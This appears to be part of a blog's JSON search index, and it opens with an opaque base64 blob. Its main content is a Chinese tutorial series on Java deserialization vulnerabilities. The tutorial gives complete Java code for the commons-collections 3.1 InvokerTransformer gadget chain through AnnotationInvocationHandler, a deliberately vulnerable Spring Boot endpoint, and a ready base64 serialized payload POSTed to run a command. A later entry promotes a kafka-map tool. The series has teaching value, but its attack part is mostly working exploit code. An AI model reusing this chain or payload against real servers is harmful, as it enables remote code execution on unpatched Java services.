kUrkw0htRKGSCweGENLH4177nEyEgEBFI0ozFyeZmLWAIv2mdTYRvz+eaao1wgSBfW6oVSbcQeW2u1Py1hENdD+ntNiSjj46Grgug7VcNtvgYXrXRzZSUjlTCyqlqYsgY07Uk4PoxzSFw39h4rVeB5eaaR49BPSplB3Rt6Q2b7eypMF+7AmwttCglSi99S6VqRlgG7fim1dXTxeXkxpd1ghvf8USu8MofIusgEnw+gxwEtSDzQnhuNHn6AOys/wPNxeSn5Rqe/2CKVfUS53aFQr498sNX6yTqFF2n6tpYCscWPQEA7il3KLpcOWGlSaPYrWm/PpWuXp3vYUOBEzwC7yGmhJvHaxyymW5P2bZOYAUaT8SEZk1n9vgfKCIDIuQSE8IXwMx1lH7RF8AoohTVoL+8ZszVYWfXg6x7/N3n5V8SxGO5XKMPOMJVQLN6vFlMaSwB85jf0WxnoDt0t+7OgaiVazyuUii1ZLz9zUnnhkpDCM2tcAxI1riYwZhWhjHbMA4wu/COPTWJgMgfGOUiP+75yqWx8og+5AC/5FVw50z5tGPzA9Goy/SfNccHqHCrJF1r4lCVovmAizVeIhvfwx5silsro+wtwMw5E//i7KgWTpjMK4lBfTN48sxDqbaY1az6HTioEB+/76wcKiMAI6rEZSQHtEnvXOyP6m82xHPYf8BtDYtopbz993WOwCtkJ4UOjqyK8Z64rgJ3bJbaXFrQ860sG31fyTpiB4CF+dZkveGQLD/lOKlC2fpYTIg8hxiD0vYux4UF//cEfH385JywsGUp8Q/DHQg2BpT/fRL2NRH1LYjuNpsdtURoRHLgkZRnCFk3gjYpqR/NswlomcC+G8W73+8FY1UKnI3GW8skks02oTvZRq6u3vaixSAivxUOBJatp+8iYEeJ7GnSbIQoGELL1wgjWKnRq+rpf4don490cF0tza5A3syc1InIC5SAva+WjFhaZFnEqvEya1FxBEcjLslmU4Nud3RDJkKV/OU/CVpMUvVJC+jAJt3UYYkEFEW1yqphGZ325bl9yhIhOm8azCh6MXSt29B2FfZZMKoa1ybgQ9w4K8rnLNezwvazFCWNiqi/PJo7c74GJvfr+U5Bnd5Op97FMSgwrqh24ECeofEtRYv7dznH33HG4wDrJkeJqVjEeKx1xOTuQwXq1Z0hb5AwQYZWoY5fbgZlh85pKIt8oAV7Rsj/ZUC3wQ8jT+izYqL7taETFF3W5lyj/yvy7N7YPT3CurBhjibaWs67y9jIKuKzEWTIRIbS7euEgJbO3FZrLkX1zhZsbRf5ZReicQAhoDEx+hDIL4joUP+pw6d9kK4/Q3uJAVkkqBoaxmaQU4mP7DrzhHg8O8u/aSxDLncO/zlzlRVshURGprPaF7lQzgtjE3dSNJ7NvBP64rpMQvoB0yGgSOogKc 点击发送请求，便可以看到本地计算机打开了计算器程序。\n注 文中测试使用系统和工具版本如下：\n 操作系统 windows 10 20H2 jdk java 1.8.0_301 springboot 2.5.5 commons-collections 3.1 shiro 1.8.0 代码仓库 https://github.com/dushixiang/java-serialization-vulnerability  其他 经过测试 commons-collections 3.2.1 版本同样可以复现上述问题，commons-collections 3.2.2 不可复现。\n参考 https://github.com/frohoff/ysoserial\n","permalink":"https://typesafe.cn/posts/java-serialization-vulnerability-2/","summary":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\n新的希望 0x00 在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 commons-collections 3.1 搭配 sun.reflect.annotation.AnnotationInvocationHandler 实现远程命令执行的方式。但sun.reflect.annotation.AnnotationInvocationHandler 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 javax.management.BadAttributeValueExpException 出现在了安全人员的视野。\njavax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。因此 javax.management.BadAttributeValueExpException 符合了 可序列化 这个要求，同样的它也增加了 readObject 方法，这个类的完整代码如下：\npackage javax.management; import java.io.IOException; import java.io.ObjectInputStream; /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it.","title":"Java 反序列化漏洞原理（二）新版本JDK利用方式和Shiro举例"},{"content":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\n序列化的定义 序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。\nJava 中的序列化 Java 自身提供了序列化的功能，需要实现 java.io.Serializable 接口，标明该对象是可序列化的。 java.io.Serializable 是一个空接口，不需要对象实现方法。\n以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。\nimport java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval0 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } } public static void main(String[] args) throws Exception { // 定义一个对象  Command command = new Command(); command.setCmd(\u0026#34;calc\u0026#34;); System.out.println(\u0026#34;序列化前: \u0026#34; + command.getCmd()); // 将用户序列化为字节数组  ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.writeObject(command); } // 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化  final String data = Base64.getEncoder().encodeToString(buffer.toByteArray()); System.out.println(\u0026#34;序列化后: \u0026#34; + data); // 将base64编码的数据再解码为字节数组  final byte[] bytes = Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8)); // 将字节数组反序列化为对象  ByteArrayInputStream b = new ByteArrayInputStream(bytes); try (ObjectInputStream input = new ObjectInputStream(b)) { final Command obj = (Command) input.readObject(); System.out.println(\u0026#34;反序列化: \u0026#34; + obj.getCmd()); } } } 运行后输出：\n序列化前: calc 序列化后: rO0ABXNyADdjbi50eXBlc2FmZS5qYXZhc2VyaWFsaXphdGlvbi5zZXJpYWxpemFibGUuRXZhbCRDb21tYW5k+hzZNZkL7qACAAFMAANjbWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABGNhbGM= 反序列化: calc 通过代码可以看出来我们并没有指定如何进行序列化和反序列化，都是Java帮助我们实现的，那能不能让我们自己来指定方式呢？答案是肯定的，通过搜索可以得出在对象中增加 writeObject readObject 两个私有方法就可以了，但是为什么可以却没有人说的清楚。\n反序列化漏洞的成因 特立独行的程序员是不允许自己使用和其他人一样的序列化和反序列化方式的，但 java.io.Serializable 是一个空接口，没有需要实现的方法，要怎么自定义自己的序列化和反序列化方式呢？他决定通过查看源码来一探究竟，于是他打开IDE，找到 final User obj = (User) input.readObject(); 这行代码，点击跳转源码，发现实际上是调用了 Object obj = readObject0(false);，进入 readObject0 的实现中发现原来当目标是对象的时候会调用 readOrdinaryObject，他接着看了下去，发现只实现 java.io.Serializable 的对象会调用 readSerialData(obj, desc); 这行代码，而 readSerialData 方法中又会调用 slotDesc.invokeReadObject(obj, this);，最终是是调用了 readObjectMethod.invoke(obj, new Object[]{ in }); ，但readObjectMethod又是从哪里来的呢？他查看了一下引用，原来是 ObjectStreamClass 的构建函数里面初始化的\nprivate ObjectStreamClass(final Class\u0026lt;?\u0026gt; cl) { ... cons = getSerializableConstructor(cl); writeObjectMethod = getPrivateMethod(cl, \u0026#34;writeObject\u0026#34;, new Class\u0026lt;?\u0026gt;[] { ObjectOutputStream.class }, Void.TYPE); readObjectMethod = getPrivateMethod(cl, \u0026#34;readObject\u0026#34;, new Class\u0026lt;?\u0026gt;[] { ObjectInputStream.class }, Void.TYPE); readObjectNoDataMethod = getPrivateMethod( cl, \u0026#34;readObjectNoData\u0026#34;, null, Void.TYPE); hasWriteObjectData = (writeObjectMethod != null); ... } 他恍然大悟，原来只需要在对象中增加一个名为 readObject参数是 java.io.ObjectInputStream 的私有方法就行了，于是他把代码修改为了这个样子\nimport java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval1 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法  in.defaultReadObject(); //执行命令  Runtime.getRuntime().exec(this.getCmd()); } } public static void main(String[] args) throws IOException, ClassNotFoundException { // 定义一个对象  Command command = new Command(); command.setCmd(\u0026#34;calc\u0026#34;); System.out.println(\u0026#34;序列化前: \u0026#34; + command.getCmd()); // 将用户序列化为字节数组  ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.writeObject(command); } // 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化  final String data = Base64.getEncoder().encodeToString(buffer.toByteArray()); System.out.println(\u0026#34;序列化后: \u0026#34; + data); // 将base64编码的数据再解码为字节数组  final byte[] bytes = Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8)); // 将字节数组反序列化为对象  ByteArrayInputStream b = new ByteArrayInputStream(bytes); try (ObjectInputStream input = new ObjectInputStream(b)) { final Command obj = (Command) input.readObject(); System.out.println(\u0026#34;反序列化: \u0026#34; + obj.getCmd()); } } } 运行后输出：\n序列化前: calc 序列化后: rO0ABXNyADdjbi50eXBlc2FmZS5qYXZhc2VyaWFsaXphdGlvbi5zZXJpYWxpemFibGUuRXZhbCRDb21tYW5k+hzZNZkL7qACAAFMAANjbWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABGNhbGM= 反序列化: calc 同时还弹出来了计算器。\nJava 反序列化漏洞的产生原因就是在执行反序列化方法的时候执行了非法的命令，但真的会有程序员这样写代码吗？非要在反序列化方法里面加上执行命令的代码。\n真实环境里面的反序列化漏洞是什么样子的？ 以 commons-collections 3.1 版本为例，InvokerTransformer 本来是用来帮助开发人员进行类型转换的，但由于其功能过于灵活，被安全人员发现可以用来执行任意代码。\n瞒天过海 首先我们来看一段简单的代码，用 InvokerTransformer 来实现 Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)。\nimport org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class Exp0 { public static void main(String[] args) { // 使用 ConstantTransformer 将 Runtime.class 包装一层，等同于 Class\u0026lt;Runtime\u0026gt; runtimeClass = Runtime.class;  Object runtimeClass = new ConstantTransformer(Runtime.class).transform(null); // 使用 InvokerTransformer 调用 runtimeClass 的 getMethod 方法,等同于 Method getRuntime = runtimeClass.getMethod(\u0026#34;getRuntime\u0026#34;, null);  Object getRuntimeMethod = new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}).transform(runtimeClass); // 使用 InvokerTransformer 调用getRuntimeMethod 的 invoke 方法,等同于 Object runtime = getRuntime.invoke(null, null);  Object runtime = new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]).transform(getRuntimeMethod); // 使用 InvokerTransformer 调用 runtime 的 exec 方法，等同于 runtime.exec(\u0026#34;calc\u0026#34;)  Object exec = new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}).transform(runtime); } } InvokerTransformer 构造方法有三个参数，分别为 方法名称、方法类型数组、方法参数数组，方法名称不用多说，其中第二个方法类型数组和第三个方法参数数组 的长度必须要相等。\nInvokerTransformer 的 transform 方法就是将输入的对象按照构造方法传入的参数转换为另一个对象，没有任何限制，因此即使程序内部没有 Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;) 这行代码，也通过InvokerTransformer来可实现调用。\n李代桃僵 尽管程序内部没有 Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;) 这行代码，但是开发人员肯定也不会把上面那一大块代码写到程序里面，因此我们还需要另想办法。首先我们先把代码简化一下，修改为链式调用。\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class Exp1 { public static void main(String[] args) { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; // 把 Transformer 使用链的方式调用，从上到下，不用再每次执行  Transformer transformerChain = ChainedTransformer.getInstance(transformers); // 调用转换  transformerChain.transform(null); } } 这样我们只需要调用一次 transform 就行了，但是想让目标系统执行我们的代码还是不可能的，因此还需要再寻求其他方式。\n暗渡陈仓 有安全人员发现，commons-collections 自己实现了 Map.Entry，并且在 setValue 的时候会先调用 TransformedMap 的 checkSetValue 方法，而这个方法又调用了我们传入的 valueTransformer 的 transform 方法，这样一套流程下来，当我们对经过 TransformedMap 转换出来的 Map 做 put 操作的时候，都会触发执行一次我们构造的任意指令。\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class Exp2 { public static void main(String[] args) { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; // 把 Transformer 使用链的方式调用，从上到下，不用再每次执行  Transformer transformerChain = ChainedTransformer.getInstance(transformers); // 利用 TransformedMap 的漏洞来执行 transform 方法  Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;name\u0026#34;, \u0026#34;守法市民小杜\u0026#34;); // TransformedMap 继承自 AbstractInputCheckedMapDecorator，Map 中的 元素会被转换为 AbstractInputCheckedMapDecorator.MapEntry  Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // AbstractInputCheckedMapDecorator.MapEntry 在 setValue 时会先调用 parent.checkSetValue(value)，而 checkSetValue 会调用 valueTransformer 的 transform 方法  outerMap.put(\u0026#34;name\u0026#34;, \u0026#34;法外狂徒张三\u0026#34;); } } 笑里藏刀 现在只差最后一步，需要找到一个类，用它创建一个对象并完成序列化，同时它还必须满足以下三个条件：\n 实现了 Serializable 接口。 增加了 readObject 方法。 成员变量中有 Map 并且在 readObject 时对这个 Map 进行了 put 操作或操作了 Map.Entry 的 setValue 方法。  安全人员在审查 openjdk 源码时发现了 sun.reflect.annotation.AnnotationInvocationHandler这个类 符合这个条件，只需用这个类创建一个对象，再将其序列化之后的内容发送到其他系统，即可完成漏洞利用。\n但只局限于以下这几个版本\n openjdk 8 https://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u20 https://hg.openjdk.java.net/jdk8u/jdk8u20/jdk/file/f5d77a430a29/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u40 https://hg.openjdk.java.net/jdk8u/jdk8u40/jdk/file/c7bbaa04eaa8/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u41 https://hg.openjdk.java.net/jdk8u/jdk8u41/jdk/file/4f0378ee824a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u60 https://hg.openjdk.java.net/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java  其 readObject 方法如下\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly  AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out  throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that  // situation is handled by the invoke method.  for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { // debug 发现这个 name 是一个固定值 \u0026#34;value\u0026#34;  String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists  Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { // 下面这行代码会触发  memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } 安全人员在 debug 时发现 Map 中的 key 为固定值 \u0026quot;value\u0026quot; ，因此我们需要将 Map 中的 key 修改为字符串 \u0026quot;value\u0026quot;，下面我们生成一个 payload。\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class Exp3 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; Transformer transformerChain = ChainedTransformer.getInstance(transformers); // 利用 TransformedMap 的漏洞来执行 transform 方法  Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;守法市民小杜\u0026#34;); // TransformedMap 继承自 AbstractInputCheckedMapDecorator，Map 中的 元素会被转换为 AbstractInputCheckedMapDecorator.MapEntry  Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // AbstractInputCheckedMapDecorator.MapEntry 在 setValue 时会先调用 parent.checkSetValue(value)，而 checkSetValue 会调用 valueTransformer 的 transform 方法 // outerMap.put(\u0026#34;value\u0026#34;, \u0026#34;法外狂徒张三\u0026#34;);  // AnnotationInvocationHandler 不是 public 类型的类，且没有公开的构造器方法，只能通过反射创建  Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); // 获取构造方法  Constructor\u0026lt;?\u0026gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class); // 因为其构造方法不是 public  constructor.setAccessible(true); // 实例化对象  Object target = constructor.newInstance(Target.class, outerMap); // 将对象序列化为字节数组  ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.writeObject(target); } // 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化  final String data = Base64.getEncoder().encodeToString(buffer.toByteArray()); System.out.println(\u0026#34;payload: \u0026#34; + data); } } 使用 maven 新建一个 springboot 项目来模拟目标环境，添加 commons-collections 3.1 的依赖，并增加一个接口如下：\nimport org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RestController; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; @RestController @SpringBootApplication public class Application { public static void main(String[] args) { SpringApplication.run(Application.class, args); } /** * apache commons-collections 3.1 版本的反序列化漏洞 * * @param request request * @return 是否成功 * @throws Exception 异常 */ @PostMapping(\u0026#34;/commons-collections-3.1\u0026#34;) public String commonsCollections3_1(HttpServletRequest request) throws Exception { ServletInputStream inputStream = request.getInputStream(); final StringBuilder sb = new StringBuilder(); try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) { char[] charBuffer = new char[1024]; int bytesRead; while ((bytesRead = bufferedReader.read(charBuffer)) \u0026gt; 0) { sb.append(charBuffer, 0, bytesRead); } } // 读取 request body 中的字符串  final String requestBody = sb.toString(); // 使用 base64 解码  final byte[] bytes = Base64.getDecoder().decode(requestBody.getBytes(StandardCharsets.UTF_8)); // 将字节数组反序列化为对象  ByteArrayInputStream b = new ByteArrayInputStream(bytes); try (ObjectInputStream input = new ObjectInputStream(b)) { Object obj = input.readObject(); System.out.println(obj); } return \u0026#34;success\u0026#34;; } } 启动 springboot 服务。\n最后增加一个发送 http 请求的测试，此步骤可以换postman 或者 burp，我这里是使用了 IDEA 自带的 http 请求工具进行测试\n### 发送POST 请求 POST http://localhost:8080/commons-collections-3.1 rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwcHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABpzcQB+ABF1cQB+ABYAAAACcHB0AAZpbnZva2V1cQB+ABoAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAWc3EAfgARdXEAfgAWAAAAAXQABGNhbGN0AARleGVjdXEAfgAaAAAAAXEAfgAdc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAV2YWx1ZXQAEuWuiOazleW4guawkeWwj+adnHh4dnIAG2phdmEubGFuZy5hbm5vdGF0aW9uLlRhcmdldAAAAAAAAAAAAAAAeHA= 请求发送成功，便可以看到电脑打开了计算器。\n注 文中测试使用系统和工具版本如下：\n 操作系统 windows 10 20H2 jdk openjdk 8u40 springboot 2.5.5 commons-collections 3.1 代码仓库 https://github.com/dushixiang/java-serialization-vulnerability  其他 在最新的 openjdk 8u 中则修复了这个问题，代码如下：\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { ... 省略 Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // consistent with runtime Map type  Map\u0026lt;String, Object\u0026gt; mv = new LinkedHashMap\u0026lt;\u0026gt;(); // If there are annotation members without values, that  // situation is handled by the invoke method.  for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : streamVals.entrySet()) { String name = memberValue.getKey(); Object value = null; Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists  value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { value = new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name)); } } mv.put(name, value); } UnsafeAccessor.setType(this, t); UnsafeAccessor.setMemberValues(this, mv); } https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/6f1875b6f29f/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java\n已经不再能够触发 transform 。\n参考 https://github.com/Cryin/Paper/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88.md\nhttps://xz.aliyun.com/t/7031#toc-10\n","permalink":"https://typesafe.cn/posts/java-serialization-vulnerability-1/","summary":"声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。\n序列化的定义 序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。\nJava 中的序列化 Java 自身提供了序列化的功能，需要实现 java.io.Serializable 接口，标明该对象是可序列化的。 java.io.Serializable 是一个空接口，不需要对象实现方法。\n以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。\nimport java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval0 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } } public static void main(String[] args) throws Exception { // 定义一个对象  Command command = new Command(); command.setCmd(\u0026#34;calc\u0026#34;); System.out.println(\u0026#34;序列化前: \u0026#34; + command.","title":"Java 反序列化漏洞原理（一）Serializable"},{"content":"使用过kafka的小伙伴应该都知道kafka本身是没有管理界面的，所有操作都需要手动执行命令来完成。但有些命令又多又长，如果没有做笔记，别说是新手，就连老手也不一定能记得住，每次想要使用的时候都要上网搜索一下。有些崇尚geek精神的人或许觉得命令行才是真爱，但使用一款好用的可视化管理工具真的可以极大的提升效率。\n今天给大家介绍的这款工具叫做kafka-map，是我针对日常工作中高频使用的场景开发的，使用了这款工具之后就不必费心费力的去查资料某个命令要怎么写，就像是：“给编程插上翅膀，给kafka装上导航”。\nkafka-map 介绍 kafka map是使用Java11和React开发的一款kafka可视化工具。\n目前支持的功能有：\n 多集群管理 集群状态监控（分区数量、副本数量、存储大小、offset） 主题创建、删除、扩容（删除需配置delete.topic.enable = true） broker状态监控 消费者组查看、删除 重置offset 消息查询（支持String和json方式展示） 发送消息（支持向指定的topic和partition发送字符串消息）  功能截图 添加集群 集群管理 broker 主题管理 消费组 查看消费组已订阅主题 topic详情——分区 topic详情——broker topic详情——消费组 topic详情——消费组重置offset topic详情——配置信息 生产消息 消费消息 docker 方式安装 一行命令即可完成安装\ndocker run -d \\  -p 8080:8080 \\  -v /opt/kafka-map/data:/usr/local/kafka-map/data \\  -e DEFAULT_USERNAME=admin -e DEFAULT_PASSWORD=admin --name kafka-map \\  --restart always dushixiang/kafka-map:latest 更多安装方式以及相信信息可查看: https://github.com/dushixiang/kafka-map\n欢迎star和分享给其他小伙伴。\n","permalink":"https://typesafe.cn/posts/share-a-kafka-web-manager/","summary":"使用过kafka的小伙伴应该都知道kafka本身是没有管理界面的，所有操作都需要手动执行命令来完成。但有些命令又多又长，如果没有做笔记，别说是新手，就连老手也不一定能记得住，每次想要使用的时候都要上网搜索一下。有些崇尚geek精神的人或许觉得命令行才是真爱，但使用一款好用的可视化管理工具真的可以极大的提升效率。\n今天给大家介绍的这款工具叫做kafka-map，是我针对日常工作中高频使用的场景开发的，使用了这款工具之后就不必费心费力的去查资料某个命令要怎么写，就像是：“给编程插上翅膀，给kafka装上导航”。\nkafka-map 介绍 kafka map是使用Java11和React开发的一款kafka可视化工具。\n目前支持的功能有：\n 多集群管理 集群状态监控（分区数量、副本数量、存储大小、offset） 